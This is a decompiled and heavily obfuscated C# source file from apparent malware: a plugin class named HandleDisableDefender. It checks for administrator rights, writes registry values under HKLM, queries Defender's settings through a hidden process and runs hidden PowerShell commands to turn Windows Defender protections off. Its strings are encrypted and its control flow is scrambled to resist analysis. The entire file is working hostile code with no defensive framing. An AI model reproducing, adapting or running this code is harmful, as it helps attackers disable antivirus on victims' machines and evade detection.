using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using HsZcU78F13T1yLWI1V;
using Microsoft.Win32;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Handler;

internal class HandleDisableDefender
{
	internal static object myK4eVxFLb3O2StKxpq;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Run()
	{
		int num = 4;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 1:
					RegistryEdit(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(458), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(550), (string)C01hmvxXjH8JoNLPIJ1(590));
					num2 = 5;
					continue;
				case 5:
					RegistryEdit(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(596), (string)C01hmvxXjH8JoNLPIJ1(730), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(590));
					num2 = 0;
					if (hOnmItxkVsFx7NOr7Oc())
					{
						num2 = 0;
					}
					continue;
				case 2:
					CheckDefender();
					num2 = 1;
					if (hOnmItxkVsFx7NOr7Oc())
					{
						num2 = 7;
					}
					continue;
				case 7:
					return;
				case 6:
					RegistryEdit(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(596), (string)C01hmvxXjH8JoNLPIJ1(838), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(590));
					num2 = 2;
					continue;
				default:
					RegistryEdit((string)C01hmvxXjH8JoNLPIJ1(596), (string)C01hmvxXjH8JoNLPIJ1(784), (string)C01hmvxXjH8JoNLPIJ1(590));
					num2 = 6;
					if (!hOnmItxkVsFx7NOr7Oc())
					{
						num2 = 2;
					}
					continue;
				case 4:
					break;
				case 3:
					return;
				}
				if (!sRI3syxcDjHNBq7htSF(new WindowsPrincipal((WindowsIdentity)kTbESFxTGfV6NFeVRgg(Q3rtZcqWGdrmw2XQDY2.RsgqFcIxyX)), WindowsBuiltInRole.Administrator, x552idqj76vcYOoFOZA.Hxvq1IOVoi))
				{
					num2 = 3;
					if (!hOnmItxkVsFx7NOr7Oc())
					{
						break;
					}
					continue;
				}
				RegistryEdit((string)C01hmvxXjH8JoNLPIJ1(324), (string)C01hmvxXjH8JoNLPIJ1(416), (string)C01hmvxXjH8JoNLPIJ1(452));
				num2 = 1;
				if (tddebXxeaKJat93kdyy() != null)
				{
					break;
				}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void RegistryEdit(string regPath, string name, string value)
	{
		switch (1)
		{
		case 1:
			try
			{
				RegistryKey registryKey = (RegistryKey)VM7QCJx3mTCpj6dDT71(Registry.LocalMachine, regPath, RegistryKeyPermissionCheck.ReadWriteSubTree, D1KVgJqgIJBMpwAIrZW.xLlqBi91yD);
				int num = 0;
				if (tddebXxeaKJat93kdyy() != null)
				{
					int num2 = default(int);
					num = num2;
				}
				switch (num)
				{
				default:
					try
					{
						int num3;
						if (registryKey == null)
						{
							num3 = 1;
							if (tddebXxeaKJat93kdyy() != null)
							{
								num3 = 0;
							}
							goto IL_0089;
						}
						goto IL_00c0;
						IL_0089:
						int num4 = default(int);
						while (true)
						{
							switch (num3)
							{
							default:
								return;
							case 3:
								JJf5nTxbXvwE6CKnRoJ(registryKey, name, value, RegistryValueKind.DWord, rCPtBSqfP9KJD5utR7e.Wh0qdV4XBL);
								num3 = 4;
								continue;
							case 2:
								break;
							case 1:
								JJf5nTxbXvwE6CKnRoJ(KiXruaxIHLweIrnuCe8(Registry.LocalMachine, regPath, cUigP4qPHoEG3RjyBbF.pYkqMoljfl), name, value, RegistryValueKind.DWord, rCPtBSqfP9KJD5utR7e.Wh0qdV4XBL);
								num3 = 0;
								if (tddebXxeaKJat93kdyy() != null)
								{
									num3 = num4;
								}
								continue;
							case 0:
								return;
							case 4:
								return;
							}
							break;
						}
						goto IL_00c0;
						IL_00c0:
						if (dtoPrUxfCwQjhlucvQ0(registryKey, name, gd04Hiq4bV9UN2GRmu7.c2pqXy3t60) != value)
						{
							num3 = 3;
							goto IL_0089;
						}
						break;
					}
					finally
					{
						int num5;
						if (registryKey == null)
						{
							num5 = 1;
							if (!hOnmItxkVsFx7NOr7Oc())
							{
								goto IL_0143;
							}
							goto IL_0147;
						}
						goto IL_017c;
						IL_017c:
						vLRMrvuporeV2PYuSv.Xoqq3sFJm(registryKey, vLRMrvuporeV2PYuSv.iMFCOAVJO);
						num5 = 2;
						if (tddebXxeaKJat93kdyy() != null)
						{
							goto IL_0143;
						}
						goto IL_0147;
						IL_0143:
						int num6 = default(int);
						num5 = num6;
						goto IL_0147;
						IL_0147:
						switch (num5)
						{
						case 1:
							goto end_IL_0127;
						case 2:
							goto end_IL_0127;
						}
						goto IL_017c;
						end_IL_0127:;
					}
				case 1:
					break;
				}
				break;
			}
			catch
			{
				int num7 = 0;
				if (!hOnmItxkVsFx7NOr7Oc())
				{
					int num8 = default(int);
					num7 = num8;
				}
				switch (num7)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void CheckDefender()
	{
		int num = 53;
		string text = default(string);
		Process process = default(Process);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 48:
				case 70:
				case 80:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2496), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 39;
						continue;
					}
					goto case 54;
				case 8:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(2960));
					num2 = 37;
					continue;
				case 47:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1144));
					num2 = 57;
					continue;
				case 46:
				case 59:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1894), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 76;
						continue;
					}
					goto case 10;
				case 50:
					RunPS(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1042));
					num2 = 74;
					if (tddebXxeaKJat93kdyy() == null)
					{
						continue;
					}
					break;
				case 66:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(3048), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 15;
						continue;
					}
					goto case 31;
				case 76:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 64;
						continue;
					}
					goto case 7;
				case 17:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2646), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 40;
						continue;
					}
					goto case 12;
				case 49:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 82;
						continue;
					}
					goto case 83;
				case 5:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(3102));
					num2 = 38;
					continue;
				case 73:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num = 25;
						break;
					}
					goto case 47;
				case 9:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1440));
					num2 = 13;
					continue;
				case 52:
					oPljePxlXPKdTthFNEn(process, OyE8Xo4Rrnb7NdtrnY.aP1qtQVAPK);
					num2 = 69;
					continue;
				case 43:
				case 56:
				case 82:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1662), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 46;
						continue;
					}
					goto case 16;
				case 60:
					return;
				case 71:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2406), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 80;
						continue;
					}
					goto case 33;
				case 53:
				{
					Process process2 = new Process();
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					m8eraDxjacZfDuyNNxR(processStartInfo, C01hmvxXjH8JoNLPIJ1(896), q4YHqRqSNdGQVQgc354.lUWqZh3lyG);
					m8eraDxjacZfDuyNNxR(processStartInfo, C01hmvxXjH8JoNLPIJ1(920), q4YHqRqSNdGQVQgc354.GRtqGu8bpE);
					QSHTnDxwC7hbn9JYR7T(processStartInfo, false, hQcy4YqsRAL0AdCZQsh.f3sqrdDfVS);
					QSHTnDxwC7hbn9JYR7T(processStartInfo, true, hQcy4YqsRAL0AdCZQsh.bLlqJ908mA);
					cqiggNx55PsNVh9eKgc(processStartInfo, ProcessWindowStyle.Hidden, tyeZG1qu7FOpZxGnGX6.IWfqI8MpPC);
					hQcy4YqsRAL0AdCZQsh.Xoqq3sFJm(processStartInfo, true, hQcy4YqsRAL0AdCZQsh.xx3q07l9kp);
					aO3FREx1khuqFd1FvMp(process2, processStartInfo, j3xBlnqNNfc4TSMRb4I.Wi6qbXCB2J);
					process = process2;
					num = 52;
					break;
				}
				case 34:
				case 42:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(730), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 0;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							num2 = 0;
						}
						continue;
					}
					goto case 73;
				case 63:
					RunPS(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2814));
					num2 = 44;
					continue;
				case 32:
					RunPS(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2268));
					num2 = 27;
					continue;
				case 33:
					RunPS(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2412));
					num = 6;
					break;
				case 68:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num = 19;
						break;
					}
					goto case 45;
				case 31:
					if (!cL0GknLXRndeve6Aqp.Xoqq3sFJm(text, (string)C01hmvxXjH8JoNLPIJ1(2646), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 2;
						if (tddebXxeaKJat93kdyy() == null)
						{
							num2 = 5;
						}
						continue;
					}
					goto case 3;
				case 55:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 28;
						continue;
					}
					goto case 9;
				case 54:
					if (cL0GknLXRndeve6Aqp.Xoqq3sFJm(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(452), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 23;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							continue;
						}
						break;
					}
					goto case 11;
				case 1:
				case 35:
				case 51:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1394), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 55;
						continue;
					}
					goto case 28;
				default:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1246), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 1;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							continue;
						}
						break;
					}
					goto case 67;
				case 18:
				case 22:
				case 81:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2912), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num = 4;
						break;
					}
					goto case 66;
				case 29:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(974), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 34;
						continue;
					}
					goto case 75;
				case 45:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2222), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 26;
						continue;
					}
					goto case 2;
				case 10:
				case 64:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2038), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 68;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							continue;
						}
						break;
					}
					goto case 45;
				case 14:
				case 23:
				case 39:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2596), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 12;
						continue;
					}
					goto case 17;
				case 21:
					text = I1BcATjawjLqB4IWTM.Xoqq3sFJm(j82y8ExDUoe6aN1IwAg(process, KhBDweq9C59nspIZmVI.A0yqlyS0S6), I1BcATjawjLqB4IWTM.NxEq3LMesk);
					num2 = 29;
					if (tddebXxeaKJat93kdyy() != null)
					{
						num2 = 2;
					}
					continue;
				case 40:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(2652));
					num2 = 78;
					continue;
				case 4:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2646), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 8;
						continue;
					}
					goto case 66;
				case 12:
				case 65:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2756), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 81;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							continue;
						}
						break;
					}
					goto case 77;
				case 28:
				case 41:
					if (!cL0GknLXRndeve6Aqp.Xoqq3sFJm(text, (string)C01hmvxXjH8JoNLPIJ1(1534), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 56;
						continue;
					}
					goto case 49;
				case 3:
				case 6:
				case 13:
				case 15:
				case 24:
				case 27:
				case 30:
				case 37:
				case 38:
				case 44:
				case 57:
				case 58:
				case 61:
				case 69:
				case 74:
				case 78:
				case 79:
					if (OyE8Xo4Rrnb7NdtrnY.Xoqq3sFJm(KhBDweq9C59nspIZmVI.Xoqq3sFJm(process, KhBDweq9C59nspIZmVI.A0yqlyS0S6), OyE8Xo4Rrnb7NdtrnY.WrsqRsQX8h))
					{
						num2 = 60;
						continue;
					}
					goto case 21;
				case 36:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1754));
					num2 = 58;
					continue;
				case 83:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1574));
					num2 = 61;
					continue;
				case 2:
				case 72:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2362), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 70;
						if (!hOnmItxkVsFx7NOr7Oc())
						{
							num2 = 62;
						}
						continue;
					}
					goto case 71;
				case 77:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(2646), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 18;
						continue;
					}
					goto case 63;
				case 11:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(2526));
					num2 = 24;
					continue;
				case 7:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1942));
					num2 = 30;
					continue;
				case 75:
					if (zvJ8ONxN9ISj3ZAn8AQ(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 50;
						continue;
					}
					goto case 34;
				case 19:
					RunPS(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2106));
					num2 = 79;
					continue;
				case 67:
					if (!cL0GknLXRndeve6Aqp.Xoqq3sFJm(text, (string)C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 35;
						continue;
					}
					goto case 62;
				case 16:
					if (cL0GknLXRndeve6Aqp.Xoqq3sFJm(text, (string)C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 36;
						if (hOnmItxkVsFx7NOr7Oc())
						{
							continue;
						}
						break;
					}
					goto case 46;
				case 62:
					RunPS((string)C01hmvxXjH8JoNLPIJ1(1296));
					num2 = 3;
					continue;
				case 26:
					if (!zvJ8ONxN9ISj3ZAn8AQ(text, C01hmvxXjH8JoNLPIJ1(1028), cL0GknLXRndeve6Aqp.VbeqyVUcVS))
					{
						num2 = 72;
						continue;
					}
					goto case 32;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void RunPS(string args)
	{
		int num = 1;
		while (true)
		{
			int num2 = num;
			do
			{
				switch (num2)
				{
				default:
					return;
				case 1:
					break;
				case 0:
					return;
				}
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				m8eraDxjacZfDuyNNxR(processStartInfo, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(896), q4YHqRqSNdGQVQgc354.lUWqZh3lyG);
				q4YHqRqSNdGQVQgc354.Xoqq3sFJm(processStartInfo, args, q4YHqRqSNdGQVQgc354.GRtqGu8bpE);
				cqiggNx55PsNVh9eKgc(processStartInfo, ProcessWindowStyle.Hidden, tyeZG1qu7FOpZxGnGX6.IWfqI8MpPC);
				QSHTnDxwC7hbn9JYR7T(processStartInfo, true, hQcy4YqsRAL0AdCZQsh.xx3q07l9kp);
				aO3FREx1khuqFd1FvMp(process, processStartInfo, j3xBlnqNNfc4TSMRb4I.Wi6qbXCB2J);
				OyE8Xo4Rrnb7NdtrnY.Xoqq3sFJm(process, OyE8Xo4Rrnb7NdtrnY.aP1qtQVAPK);
				num2 = 0;
			}
			while (tddebXxeaKJat93kdyy() == null);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleDisableDefender()
	{
		J5ptw3xOfAvt3X8rbvU();
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object kTbESFxTGfV6NFeVRgg(object P_0)
	{
		return Q3rtZcqWGdrmw2XQDY2.Xoqq3sFJm((Q3rtZcqWGdrmw2XQDY2)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool sRI3syxcDjHNBq7htSF(object P_0, WindowsBuiltInRole P_1, object P_2)
	{
		return x552idqj76vcYOoFOZA.Xoqq3sFJm(P_0, P_1, (x552idqj76vcYOoFOZA)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object C01hmvxXjH8JoNLPIJ1(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool hOnmItxkVsFx7NOr7Oc()
	{
		return myK4eVxFLb3O2StKxpq == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleDisableDefender tddebXxeaKJat93kdyy()
	{
		return (HandleDisableDefender)myK4eVxFLb3O2StKxpq;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object VM7QCJx3mTCpj6dDT71(object P_0, object P_1, RegistryKeyPermissionCheck P_2, object P_3)
	{
		return D1KVgJqgIJBMpwAIrZW.Xoqq3sFJm(P_0, (string)P_1, P_2, (D1KVgJqgIJBMpwAIrZW)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object KiXruaxIHLweIrnuCe8(object P_0, object P_1, object P_2)
	{
		return cUigP4qPHoEG3RjyBbF.Xoqq3sFJm(P_0, (string)P_1, (cUigP4qPHoEG3RjyBbF)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JJf5nTxbXvwE6CKnRoJ(object P_0, object P_1, object P_2, RegistryValueKind P_3, object P_4)
	{
		rCPtBSqfP9KJD5utR7e.Xoqq3sFJm(P_0, (string)P_1, P_2, P_3, (rCPtBSqfP9KJD5utR7e)P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object dtoPrUxfCwQjhlucvQ0(object P_0, object P_1, object P_2)
	{
		return gd04Hiq4bV9UN2GRmu7.Xoqq3sFJm(P_0, (string)P_1, (gd04Hiq4bV9UN2GRmu7)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void m8eraDxjacZfDuyNNxR(object P_0, object P_1, object P_2)
	{
		q4YHqRqSNdGQVQgc354.Xoqq3sFJm(P_0, (string)P_1, (q4YHqRqSNdGQVQgc354)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void QSHTnDxwC7hbn9JYR7T(object P_0, bool P_1, object P_2)
	{
		hQcy4YqsRAL0AdCZQsh.Xoqq3sFJm(P_0, P_1, (hQcy4YqsRAL0AdCZQsh)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void cqiggNx55PsNVh9eKgc(object P_0, ProcessWindowStyle P_1, object P_2)
	{
		tyeZG1qu7FOpZxGnGX6.Xoqq3sFJm(P_0, P_1, (tyeZG1qu7FOpZxGnGX6)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void aO3FREx1khuqFd1FvMp(object P_0, object P_1, object P_2)
	{
		j3xBlnqNNfc4TSMRb4I.Xoqq3sFJm(P_0, (ProcessStartInfo)P_1, (j3xBlnqNNfc4TSMRb4I)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool oPljePxlXPKdTthFNEn(object P_0, object P_1)
	{
		return OyE8Xo4Rrnb7NdtrnY.Xoqq3sFJm(P_0, (OyE8Xo4Rrnb7NdtrnY)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object j82y8ExDUoe6aN1IwAg(object P_0, object P_1)
	{
		return KhBDweq9C59nspIZmVI.Xoqq3sFJm(P_0, (KhBDweq9C59nspIZmVI)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool zvJ8ONxN9ISj3ZAn8AQ(object P_0, object P_1, object P_2)
	{
		return cL0GknLXRndeve6Aqp.Xoqq3sFJm(P_0, (string)P_1, (cL0GknLXRndeve6Aqp)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void J5ptw3xOfAvt3X8rbvU()
	{
		WkMgYHbfSUMGdoITRx.D8j0NC3zOxwAq();
	}
}
